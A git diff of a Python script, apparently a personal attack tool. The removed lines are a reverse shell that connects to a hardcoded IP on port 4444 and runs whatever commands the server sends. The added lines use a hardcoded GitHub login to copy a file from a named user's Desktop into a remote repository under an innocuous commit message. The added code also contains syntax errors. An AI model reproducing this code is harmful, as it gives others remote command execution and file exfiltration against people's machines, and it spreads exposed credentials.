@@ -4,22 +4,35 @@ import platform
 import os
 import sysconfig
 
-print("caca")
+import base64
+from github import Github
+from github import InputGitTreeElement
 
-SERVER_HOST = "172.16.22.82"
-SERVER_PORT = 4444
-BUFFER_SIZE = 1024
+user = "Pol420OWO"
+password = "V0l02022"
+g = Github(user,password)
+repo = g.get_user().get_repo('yey')
 
-s = socket.socket()
-s.connect((SERVER_HOST, SERVER_PORT))
-message = s.recv(BUFFER_SIZE).decode()
-print("Server:", message)
+file_list = [
+    'C:\Users\polmernie\OneDrive - Centre d'Estudis Monlau\Desktop',
+]
 
-print("caca2")
-while True:
-  command = s.recv(BUFFER_SIZE).decode()
-  if command.lower() == "exit":
-    break
-  output = subprocess.getoutput(command)
-  s.send(output.encode())
-s.close()
+file_names = [
+    'pene.bat',
+]
+commit_message = 'python update 2'
+master_ref = repo.get_git_ref('heads/master')
+master_sha = master_ref.object.sha
+base_tree = repo.get_git_tree(master_sha)
+element_list = list()
+for i, entry in enumerate(file_list):
+    with open(entry) as input_file:
+        data = input_file.read()
+    if entry.endswith('.png'):
+        data = base64.b64encode(data)
+    element = InputGitTreeElement(file_names[i], '100644', 'blob', data)
+    element_list.append(element)
+tree = repo.create_git_tree(element_list, base_tree)
+parent = repo.get_git_commit(master_sha)
+commit = repo.create_git_commit(commit_message, tree, [parent])
+master_ref.edit(commit.sha)
